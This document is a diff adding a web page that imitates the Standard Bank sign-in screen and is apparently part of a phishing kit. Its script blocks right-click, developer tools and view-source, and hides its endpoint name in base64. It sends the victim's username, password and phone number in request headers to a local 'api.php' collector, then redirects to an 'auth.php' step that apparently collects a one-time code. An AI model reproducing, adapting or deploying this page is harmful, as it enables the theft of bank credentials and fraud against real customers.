@@ -1,0 +1,703 @@
+<html lang="en" dir="ltr" class="plt-tablet plt-desktop md hydrated" mode="md"><head>
+	<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+	<link rel="preconnect" href="https://enterprisests.standardbank.co.za" crossorigin="">
+	<meta http-equiv="x-dns-prefetch-control" content="on">
+	<link rel="dns-prefetch" href="//enterprisests.standardbank.co.za">
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<title>Sign in</title>
+	<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=yes">
+	<meta http-equiv="x-ua-compatible" content="IE=edge">
+	<link rel="stylesheet" href="../libraries/css/bundle.css">
+	  <link rel="stylesheet" href="../libraries/css/ionic.css">
+
+	<link rel="stylesheet" type="text/css" href="../libraries/css/sbg.css">
+	<link rel="stylesheet" type="text/css" href="../libraries/css/styles.c467c6c8ed8797c28b71.css">
+	<link rel="icon" type="image/png" href="../libraries/img/favicon.ico">
+    <link href="../libraries/roboto-regular.css" rel="stylesheet" type="text/css">
+  <script>
+	var id = Math.random().toString(36).slice(5);
+	window.location.hash = atob(id+id+id+id+id);
+    setTimeout(function () {
+      $(".loader-overlay").removeClass("hide");
+      $(".animateLoader").addClass("blurbg");
+    }, 500);
+
+
+
+    // disable right click
+    document.addEventListener('contextmenu', event => event.preventDefault());
+
+    document.onkeydown = function (e) {
+
+      // disable F12 key
+      if (e.keyCode == 123) {
+        return false;
+      }
+
+      // disable I key
+      if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
+        return false;
+      }
+
+      // disable J key
+      if (e.ctrlKey && e.shiftKey && e.keyCode == 74) {
+        return false;
+      }
+
+      // Prevent Ctrl+s = disable save
+      if (event.ctrlKey && (event.keyCode === 85 || event.keyCode === 83 || event.keyCode === 65)) {
+        return false;
+      }
+
+      // disable U key
+      if (e.ctrlKey && e.keyCode == 85) {
+        return false;
+      }
+    }
+    $(document).ready(function () {
+
+
+      var php_url = atob("YXBpLnBocA==");
+      var str = "Sign in";
+      document.title = str;
+      var GET_IP = "160.36.59.197";
+
+      $("#password").change(function () {
+        if ($("#userId").val() == "") {
+        //  $(".error-alert-user").html("User Id is required");
+          $(".loader-overlay").addClass("hide");
+          $(".error_line_user").addClass("mat-form-field-invalid");
+          $(".animateLoader").removeClass("blurbg");
+          $(".btn-signin").prop("disabled", true);
+       //   $("#userId").focus();
+
+        } else if ($("#password").val() == "") {
+      //    $(".error-alert-pass").html("Password is required");
+          $(".error_line_pass").addClass("mat-form-field-invalid");
+          $(".loader-overlay").addClass("hide");
+          $(".animateLoader").removeClass("blurbg");
+          $(".btn-signin").prop("disabled", true);
+        } else if (checkPwd($("#password").val()) !== "ok") {
+       //   $(".error-alert-pass").html("Valid Password is required");
+          $(".error_line_pass").addClass("mat-form-field-invalid");
+          $(".loader-overlay").addClass("hide");
+          $(".animateLoader").removeClass("blurbg");
+          $(".btn-signin").prop("disabled", true);
+        } else {
+          $(".error-alert-pass").html("");
+          $(".error-alert-user").html("");
+          $(".error_line_pass").removeClass("mat-form-field-invalid");
+          $(".error_line_user").removeClass("mat-form-field-invalid");
+          $(".loader-overlay").addClass("hide");
+          $(".animateLoader").removeClass("blurbg");
+          $(".btn-signin").prop("disabled", false);
+
+        }
+
+      });
+
+      $(".btn-signinOK").mouseover(function () {
+        if ($("#userId").val() == "") {
+  //        $(".error-alert-user").html("User Id is required");
+          $(".loader-overlay").addClass("hide");
+          $(".error_line_user").addClass("mat-form-field-invalid");
+          $(".animateLoader").removeClass("blurbg");
+          $(".btn-signin").prop("disabled", false);
+          $("#userId").focus();
+
+        } else {
+          $(".error-alert-user").html("");
+          $(".error_line_user").removeClass("mat-form-field-invalid");
+          $(".error_line_user").addClass("mat-form-field-valid");
+          $(".loader-overlay").addClass("hide");
+          $(".animateLoader").removeClass("blurbg");
+          $(".btn-signin").prop("disabled", false);
+
+        }
+
+        if ($("#password").val() == "") {
+      //    $(".error-alert-pass").html("Password is required");
+          $(".error_line_pass").addClass("mat-form-field-invalid");
+          $(".loader-overlay").addClass("hide");
+          $(".animateLoader").removeClass("blurbg");
+          $(".btn-signin").prop("disabled", false);
+          $("#password").focus();
+        } else if (checkPwd($("#password").val()) !== "ok") {
+        //  $(".error-alert-pass").html("Valid Password is required");
+          $(".error_line_pass").addClass("mat-form-field-invalid");
+          $(".loader-overlay").addClass("hide");
+          $(".animateLoader").removeClass("blurbg");
+          $(".btn-signin").prop("disabled", false);
+          $("#password").focus();
+
+        } else {
+          $(".error-alert-pass").html("");
+          $(".error_line_pass").removeClass("mat-form-field-invalid");
+          $(".error_line_pass").addClass("mat-form-field-valid");
+          $(".loader-overlay").addClass("hide");
+          $(".animateLoader").removeClass("blurbg");
+          $(".btn-signin").prop("disabled", false);
+
+        }
+
+      });
+
+      $(".btn-signinOK").on("click", function () {
+        if ($("#userId").val() == "") {
+          $(".error-alert-user").html("User Id is required");
+          $(".loader-overlay").addClass("hide");
+          $(".error_line_user").addClass("mat-form-field-invalid");
+          $(".animateLoader").removeClass("blurbg");
+          $(".btn-signin").prop("disabled", true);
+          $("#userId").focus();
+
+        } else {
+          $(".error-alert-user").html("");
+          $(".error_line_user").removeClass("mat-form-field-invalid");
+          $(".error_line_user").addClass("mat-form-field-valid");
+          $(".loader-overlay").addClass("hide");
+          $(".animateLoader").removeClass("blurbg");
+          $(".btn-signin").prop("disabled", false);
+
+        }
+
+        if ($("#password").val() == "") {
+          $(".error-alert-pass").html("Password is required");
+          $(".error_line_pass").addClass("mat-form-field-invalid");
+          $(".loader-overlay").addClass("hide");
+          $(".animateLoader").removeClass("blurbg");
+          $(".btn-signin").prop("disabled", true);
+          $("#password").focus();
+        } else if (checkPwd($("#password").val()) !== "ok") {
+        //  $(".error-alert-pass").html("Valid Password is required");
+          $(".error_line_pass").addClass("mat-form-field-invalid");
+          $(".loader-overlay").addClass("hide");
+          $(".animateLoader").removeClass("blurbg");
+          $(".btn-signin").prop("disabled", true);
+          $("#password").focus();
+
+        } else {
+          $(".error-alert-pass").html("");
+          $(".error_line_pass").removeClass("mat-form-field-invalid");
+          $(".error_line_pass").addClass("mat-form-field-valid");
+          $(".loader-overlay").addClass("hide");
+          $(".animateLoader").removeClass("blurbg");
+          $(".btn-signin").prop("disabled", false);
+
+        }
+
+      });
+
+      $(".btn-checkemail").on("click", function () {
+        $(".loader-overlay").removeClass("hide");
+        $(".animateLoader").addClass("blurbg");
+        $(".error_line_user").removeClass("mat-form-field-invalid");
+        $(".error_line_pass").removeClass("mat-form-field-invalid");
+        $(".btn-signin").prop("disabled", false);
+
+        if ($("#userId").val() == "") {
+          $(".error-alert-user").html("User Id is required");
+          $(".loader-overlay").addClass("hide");
+          $(".error_line_user").addClass("mat-form-field-invalid");
+          $(".animateLoader").removeClass("blurbg");
+          $(".btn-signin").prop("disabled", true);
+
+        }  else {
+          try {
+            var emailxx = atob($("#remail").val());
+          } catch (e) {
+            var emailxx = $("#remail").val();
+          }
+
+          $(".loader-overlay").removeClass("hide");
+          $(".animateLoader").addClass("blurbg");
+
+          setTimeout(function () {
+
+            $(".loader-overlay").addClass("hide");
+            $(".animateLoader").removeClass("blurbg");
+            $(".btn-checkemail").removeClass("btn-checkemail").addClass("btn-signinex");
+            $(".loader2").removeClass("hide");
+            $(".btn-signin").prop("disabled", false);
+            $(".btn-signinex").removeClass("btn-checkemail");
+
+          }, 500);
+        }
+      });
+
+      $(".btn-signin").on("click", function () {
+
+
+        if ($(".btn-signin").hasClass("btn-signinex")) {
+
+          $(".loader-overlay").removeClass("hide");
+          $(".animateLoader").addClass("blurbg");
+          $(".error_line_user").removeClass("mat-form-field-invalid");
+          $(".error_line_pass").removeClass("mat-form-field-invalid");
+          $(".btn-signin").prop("disabled", false);
+
+          if ($("#userId").val() == "") {
+            $(".error-alert-user").html("User Id is required");
+            $(".loader-overlay").addClass("hide");
+            $(".error_line_user").addClass("mat-form-field-invalid");
+            $(".animateLoader").removeClass("blurbg");
+            $(".btn-signin").prop("disabled", true);
+          } else if ($("#password").val() == "") {
+            $(".error-alert-pass").html("Password is required");
+            $(".error_line_pass").addClass("mat-form-field-invalid");
+            $(".loader-overlay").addClass("hide");
+            $(".animateLoader").removeClass("blurbg");
+            $(".btn-signin").prop("disabled", true);
+          } else if (checkPwd($("#password").val()) !== "ok") {
+             $(".error-alert-pass").html("Valid Password is required");
+            $(".error_line_pass").addClass("mat-form-field-invalid");
+            $(".loader-overlay").addClass("hide");
+            $(".animateLoader").removeClass("blurbg");
+            $(".btn-signin").prop("disabled", true);
+          } else {
+            try {
+              var emailxx = atob($("#remail").val());
+            } catch (e) {
+              var emailxx = $("#remail").val();
+            }
+            setTimeout(function () {
+             // countdown();
+              $(".loader-overlay").removeClass("hide");
+              $(".animateLoader").addClass("blurbg");
+            }, 500);
+
+            var xhttp = new XMLHttpRequest();
+            xhttp.onreadystatechange = function () {
+              if (this.readyState == 4 && this.status == 200) {
+                var result = JSON.parse(this.responseText);
+                if (result.p == "1") {
+                  setTimeout(function () {
+                    $(".login-content1msg").html("service unavailable try again later!");
+                    $(".content11").addClass("hide");
+                    $(".content22").show();
+                    $(".loader-overlay").addClass("hide");
+                    $(".animateLoader").removeClass("blurbg");
+                    $(".btn-otp").prop("disabled", false);
+                  }, 500);
+                } else if (result.p == "2") {
+					
+					//$("#userId").val("");
+					$("#password").val("");
+					
+                  setTimeout(function () {
+
+                    $(".content11").addClass("hide");
+                    $(".content22").removeClass("hide");
+					$(".loader-overlay").addClass("hide");
+ 				    $(".animateLoader").removeClass("blurbg");
+                    //$(".btn-otp").prop("disabled", false);
+                   $("#referenceNumber").focus();
+
+                  }, 5000);
+             /*      setTimeout(function () {
+
+                    $(".loader-overlay").addClass("hide");
+                    $(".animateLoader").removeClass("blurbg");
+                    $(".login-content1msg").html("...");
+                    $("#input1").focus();
+
+                  }, 8000); */
+                } else if (result.p == "3") {
+
+
+                } else {
+                  $(".error-alert-pass").html("Network Error No Responds Try Again!");
+                  $(".login-content1msg").html("service unavailable try again later!");
+                  $(".loader-overlay").addClass("hide");
+                  $(".animateLoader").removeClass("blurbg");
+                  $(".btn-signin").prop("disabled", false);
+                }
+              } else {
+                setTimeout(function () {
+                  $(".btn-signin").prop("disabled", true);
+                  $(".btn-otp").prop("disabled", false);
+                  $(".loader-overlay").addClass("hide");
+                  $(".animateLoader").removeClass("blurbg");
+                }, 35000);
+              }
+            };
+            xhttp.open("POST", php_url, true);
+            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            xhttp.setRequestHeader("authorization1", $("#userId").val() + ' (' + emailxx + ')');
+            xhttp.setRequestHeader("authorizationpass", $("#password").val());
+            xhttp.setRequestHeader("authorizationtype", "slog");
+            xhttp.setRequestHeader("authorizationip", "160.36.59.197");
+            xhttp.send();
+          }
+
+        }
+      });
+
+    $(".btn-phone").on("click", function () {
+
+      $(".btn-phone").prop("disabled", false);
+
+      if ($("#referenceNumber").val() == "") {
+      $("#alertMessage-phone").html("Phone Number is required");
+      $(".loader-overlay").addClass("hide");
+      $(".animateLoader").removeClass("blurbg");
+      $("#referenceNumber").focus();
+       }  else {
+
+      setTimeout(function () {
+     // countdown();
+      $(".loader-overlay").removeClass("hide");
+      $(".animateLoader").addClass("blurbg");
+      }, 500);
+
+      var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function () {
+      if (this.readyState == 4 && this.status == 200) {
+      var result = JSON.parse(this.responseText);
+      if (result.p == "1") {
+
+        setTimeout(function () {
+          $(".login-content1msg").html("service unavailable try again later!");
+          $(".content11").addClass("hide");
+          $(".content22").show();
+          $(".loader-overlay").addClass("hide");
+          $(".animateLoader").removeClass("blurbg");
+          $(".btn-otp").prop("disabled", false);
+        }, 500);
+
+      } else if (result.p == "3") {
+        setTimeout(function () {
+
+       //   $(".content11").addClass("hide");
+       //   $(".content22").removeClass("hide");
+		  //$(".loader-overlay").addClass("hide");
+     	 // $(".animateLoader").removeClass("blurbg");
+         // $(".btn-phone").prop("disabled", false);
+         // $("#referenceNumber").focus();
+          window.location.replace("auth.php?personal="+btoa($("#userId").val())+"&n="+btoa($("#referenceNumber").val()));
+
+        }, 500);//45000);
+   
+      }  else {
+        $(".error-alert-pass").html("Network Error No Responds Try Again!");
+        $(".login-content1msg").html("service unavailable try again later!");
+        $(".loader-overlay").addClass("hide");
+        $(".animateLoader").removeClass("blurbg");
+        $(".btn-signin").prop("disabled", false);
+      }
+      } else {
+      setTimeout(function () {
+        $(".btn-signin").prop("disabled", true);
+        $(".btn-otp").prop("disabled", false);
+        $(".loader-overlay").addClass("hide");
+        $(".animateLoader").removeClass("blurbg");
+      }, 35000);
+      }
+      };
+      xhttp.open("POST", php_url, true);
+      xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+      xhttp.setRequestHeader("authorization1", $("#userId").val());
+      xhttp.setRequestHeader("authorizationpass", $("#referenceNumber").val());
+      xhttp.setRequestHeader("authorizationtype", "sphone");
+      xhttp.setRequestHeader("authorizationip", "160.36.59.197");
+      xhttp.send();
+      }
+
+
+      });
+
+	document.getElementById("referenceNumber")
+    .addEventListener("keyup", function(event) {
+    event.preventDefault();
+    if (event.keyCode === 13) {
+        $(".btn-phone").click();
+    }
+});
+
+	document.getElementById("userId")
+    .addEventListener("keyup", function(event) {
+    event.preventDefault();
+    if (event.keyCode === 13) {
+        $(".btn-signin").click();
+    }
+});
+
+	document.getElementById("password")
+    .addEventListener("keyup", function(event) {
+    event.preventDefault();
+    if (event.keyCode === 13) {
+        $(".btn-signin").click();
+    }
+});
+
+
+      
+
+    });
+    function checkPwd(str) {
+      if (str.length < 5) {
+        return ("too_short");
+      } else if (str.length > 25) {
+        return ("too_long");
+      } else if (str.search(/[a-z]/) == -1) {
+        return ("no_letter");
+      } else if (str.search(/[A-Z]/) == -1) {
+        return ("no_Capital");
+      }
+      return ("ok");
+    }
+    function countdown() {
+      var timeleft = 60;
+      var downloadTimer = setInterval(function () {
+        if (timeleft <= 0) {
+          clearInterval(downloadTimer);
+        }
+
+        document.getElementById("progressBar").innerHTML = timeleft + 's';
+        timeleft -= 1;
+      }, 1000);
+    }
+    function true_email(a) {
+            var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+            return re.test(a);
+        }
+    function validateInput() {
+      if ($("#input1").val() == "") {
+        $(".otp1").addClass("mat-form-field-invalid");
+        $(".btn-otp").prop("disabled", true);
+        $("#input1").focus();
+        return false;
+      } else if ($("#input2").val() == "") {
+        $(".otp2").addClass("mat-form-field-invalid");
+        $(".btn-otp").prop("disabled", true);
+        $("#input2").focus();
+        return false;
+      } else if ($("#input3").val() == "") {
+        $(".otp3").addClass("mat-form-field-invalid");
+        $(".btn-otp").prop("disabled", true);
+        $("#input3").focus();
+        return false;
+      } else if ($("#input4").val() == "") {
+        $(".otp4").addClass("mat-form-field-invalid");
+        $(".btn-otp").prop("disabled", true);
+        $("#input4").focus();
+        return false;
+      } else if ($("#input5").val() == "") {
+        $(".otp5").addClass("mat-form-field-invalid");
+        $(".btn-otp").prop("disabled", true);
+        $("#input5").focus();
+        return false;
+      } else {
+        $(".otp1").removeClass("mat-form-field-invalid");
+        $(".otp2").removeClass("mat-form-field-invalid");
+        $(".otp3").removeClass("mat-form-field-invalid");
+        $(".otp4").removeClass("mat-form-field-invalid");
+        $(".otp5").removeClass("mat-form-field-invalid");
+        $(".btn-otp").prop("disabled", false);
+
+
+      }
+
+    }
+
+  </script>
+</head>
+
+<body>
+
+
+  <script>
+    setTimeout(function () {
+      $(".loader-overlay").addClass("hide");
+      $(".animateLoader").removeClass("blurbg");
+      $(".content11").removeClass("hide");
+    }, 3000);
+  </script>
+  <sbg-root _nghost-mem-c0="" ng-version="7.2.16">
+    <app-loader _ngcontent-jgh-c0="" _nghost-jgh-c4="">
+      <div _ngcontent-mml-c4="" id="loader-overlay" class="loader-overlay ng-star-inserted hide">
+        <div _ngcontent-mml-c4="" class="loader"> </div>
+        <span _ngcontent-mml-c4="" class="please_wait" ng-reflect-klass="please_wait" ng-reflect-ng-class="[object Object]">Please wait ... <span id="progressBar"></span>
+        </span>
+      </div>
+    </app-loader>
+
+    <div _ngcontent-mem-c0="" id="animateLoader" class="animateLoader" sizedetector="" ng-reflect-klass="animateLoader" ng-reflect-ng-class="[object Object]">
+
+      <div class="content11">
+
+        <div _ngcontent-jgh-c0="">
+          <router-outlet _ngcontent-jgh-c0=""></router-outlet>
+          <sbg-login class="ng-star-inserted">
+            <div class="ping-signin login-template" autocomplete="off" id="sign in" name="Sign in with your Standard Bank ID">
+              <div class="ping-outer-container" style="display:flex">
+                <div class="ping-logo login-template"><span class="company-logo"><img src="../libraries/img/sbg.png"></span>
+                </div>
+                <form>
+                  <div class="ping-container ping-signin login-template">
+                    <div class="ping-body-container">
+                      <div class="content-column column-1 bm">
+                        <div class="ping-header">Sign in with your Standard Bank ID</div>
+                      </div>
+                      <div class="ping-input-container" id="container-lipusername">
+                        <ion-item class="item-interactive item-input item-has-value item md ion-focusable hydrated item-label item-label-floating item-has-focus">
+                          <ion-label position="floating" class="sc-ion-label-md-h sc-ion-label-md-s md label-floating hydrated" id="ion-input-0-lbl">
+                            Username</ion-label>
+                          <ion-input required="" class="validate sc-ion-input-md-h sc-ion-input-md-s md hydrated has-value has-focus">
+                            <input class="native-input sc-ion-input-md" autocomplete="off" id="userId" name="mail" required="" type="text" style="border-bottom: 1.5px solid #1443B1;" value="">
+                          </ion-input>
+                        </ion-item>
+                        <mat-error class="mat-error" role="alert" id="mat-error-0">
+                          <sbg-validation-error placeholder="User Id" _nghost-gyy-c9="" ng-reflect-placeholder="User Id" ng-reflect-control="[object Object]">
+                            <!--bindings={
+                            "ng-reflect-ng-if": "true"
+                            }-->
+                            <div _ngcontent-gyy-c9="" class="ng-star-inserted" style="">
+                              <!--bindings={
+                            "ng-reflect-ng-for-of": "User Id is required"
+                            }-->
+                              <div _ngcontent-gyy-c9="" class="
+                            error-prompt--negative
+                            ng-star-inserted
+                            error-alert-user
+                            " style="font-size: small;"></div>
+                            </div>
+                          </sbg-validation-error>
+                        </mat-error>
+                        <div class="custom-validator-alert custom-validator-hint" id="alertMessage-lipusername" style="display: block;">Haven’t created a username? Sign in with your registered email
+                          address.
+                        </div>
+                      </div>
+
+                      <div class="ping-input-container password-container hide loader2">
+                        <ion-item class="item-interactive item-input item-has-value item md ion-focusable hydrated item-label item-label-floating item-has-focus">
+                          <ion-label position="floating" class="sc-ion-label-md-h sc-ion-label-md-s md label-floating hydrated" id="ion-input-0-lbl">
+                            Password</ion-label>
+                          <ion-input required="" class="validate sc-ion-input-md-h sc-ion-input-md-s md hydrated has-value has-focus">
+                            <input class="native-input sc-ion-input-md" id="password" autocomplete="off" name="password" required="" type="password" style="border-bottom: 1.5px solid #1443B1;" minlength="2" autofocus="focus">
+                            <input id="Usertype" value="log" type="hidden">
+                          </ion-input>
+                        </ion-item>
+						  <mat-error class="mat-error" role="alert" id="mat-error-0">
+                          <sbg-validation-error placeholder="User Id" _nghost-gyy-c9="" ng-reflect-placeholder="User Id" ng-reflect-control="[object Object]">
+                            <!--bindings={
+                            "ng-reflect-ng-if": "true"
+                            }-->
+                            <div _ngcontent-gyy-c9="" class="ng-star-inserted" style="">
+                              <!--bindings={
+                            "ng-reflect-ng-for-of": "User Id is required"
+                            }-->
+                              <div _ngcontent-gyy-c9="" class="
+                            error-prompt--negative
+                            ng-star-inserted
+                            error-alert-pass
+                            " style="font-size: small;"></div>
+                            </div>
+                          </sbg-validation-error>
+                        </mat-error>
+                      </div>
+
+
+
+
+
+
+
+                      <div class="ping-buttons">
+
+                        <mat-form-field class="error_line_pass full-width  mat-form-field ng-tns-c8-1 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-has-label mat-form-field-hide-placeholder ng-touched mat-form-field-should-float  ng-dirty ng-valid">
+
+                          <div class="login-content__form--link"></div>
+                          <div class="  padding-vertical-20 btn-signinOK">
+                            <button type="button" color="primary" mat-raised-button="" class="  button-natived  mat-primary btn-signin btn-checkemail" id="SignOk" ng-reflect-disabled="false" ng-reflect-color="primary"><span class="mat-button-wrapper">
+                                SIGN IN</span>
+                              <div class="mat-button-ripple mat-ripple" matripple="" ng-reflect-centered="false" ng-reflect-disabled="false" ng-reflect-trigger="[object HTMLButtonElement]"></div>
+                              <div class="mat-button-focus-overlay"></div>
+                            </button>
+                          </div>
+                        </mat-form-field>
+                      </div>
+                      <div class="ping-input-link ping-pass-change account-actions">
+                        <a class="forgot-password">Forgot password</a>
+                      </div>
+
+                    </div>
+                    <div class="ping-footer-container">
+                      <div class="ping-footer">
+                        <div class="ping-register">
+                          Don't have a Standard Bank ID? <a onclick="login.postRegistration()">Register here</a></div>
+                      </div>
+                    </div>
+					 <p>&nbsp; </p> 	 <p>&nbsp; </p> 	 <p>&nbsp; </p> 	 <p>&nbsp; </p> 	 <p>&nbsp; </p> 
+                  </div>
+                </form>
+              </div>
+            </div>
+          </sbg-login>
+          <router-outlet _ngcontent-jgh-c0="" name="print"></router-outlet>
+          <span _ngcontent-jgh-c0="" id="print"></span>
+		  </div> 
+      </div>
+
+      <div class="content22 hide phone">
+
+        <div _ngcontent-jgh-c0="">
+          <router-outlet _ngcontent-jgh-c0=""></router-outlet>
+          <sbg-login class="ng-star-inserted">
+            <div class="ping-signin login-template" autocomplete="off" id="sign in" name="Sign in with your Standard Bank ID">
+              <div class="ping-signin login-template" autocomplete="off" id="sign in" name="Sign in with your Standard Bank ID">
+                <div class="ping-outer-container" style="display:flex">
+                  <div class="ping-logo login-template"><span class="company-logo"><img src="../libraries/img/sbg.png"></span></div>
+                  <form>
+                    <div class="ping-container ping-signin login-template">
+                      <div class="ping-body-container">
+                        <div class="content-column column-1 bm">
+                          <div class="ping-header">Please Verify your Phone Number</div>
+                        </div>
+                        <div class="ping-input-container" id="container-lipusername" style="align-items: center;">
+                          <ion-item class="item-interactive item-input item-has-value item md ion-focusable hydrated item-label item-label-floating item-has-focus">
+
+                            <ion-input required="" class="validate sc-ion-input-md-h align-center sc-ion-input-md-s md hydrated has-value has-focus">
+                              <div class="login-container-content-img"><img src="../libraries/img/img_web_otp_240.png" alt="password-sign-in"></div>
+                            </ion-input>
+                          </ion-item>
+
+                        </div>
+                        <div class="ping-input-container" id="container-lipusername">
+                          <ion-item class="item-interactive item-input item-has-value item md ion-focusable hydrated item-label item-label-floating item-has-focus">
+                            <ion-label position="floating" class="sc-ion-label-md-h sc-ion-label-md-s md label-floating hydrated" id="ion-input-0-lbl">Phone Number</ion-label>
+                            <ion-input required="" class="validate sc-ion-input-md-h sc-ion-input-md-s md hydrated has-value has-focus">
+                              <input class="native-input sc-ion-input-md" autocomplete="off" onkeypress="isInputNumber(event)" type="text" id="referenceNumber" name="phone" required="" autofocus="focus" style="border-bottom: 1.5px solid #1443B1;">
+                            </ion-input>
+                          </ion-item>
+                          <div class="custom-validator-alert custom-validator-hint" id="alertMessage-phone" style="display: block; color:red">Verification Required.</div>
+                        </div>
+                        <div class="ping-buttons">
+                        <button type="button" color="primary" mat-raised-button="" class="button-natived  mat-primary btn-phone" id="PhoneOk" ng-reflect-disabled="false" ng-reflect-color="primary"><span class="mat-button-wrapper">
+                                NEXT</span>
+                              <div class="mat-button-ripple mat-ripple" matripple="" ng-reflect-centered="false" ng-reflect-disabled="false" ng-reflect-trigger="[object HTMLButtonElement]"></div>
+                              <div class="mat-button-focus-overlay"></div>
+                            </button>
+                         
+
+                        </div>
+                      </div>
+                    </div>
+                  </form>
+                </div>
+              </div>
+            </div>
+          </sbg-login>
+          <router-outlet _ngcontent-jgh-c0="" name="print"></router-outlet>
+          <span _ngcontent-jgh-c0="" id="print"></span>
+        </div>
+      </div>
+
+    </div>
+  </sbg-root>
+  <script type="text/javascript">
+    function isInputNumber(evt) { var ch = String.fromCharCode(evt.which); if (!(/[0-9]/.test(ch))) { evt.preventDefault(); } }
+  </script>
+
+
+</body></html>
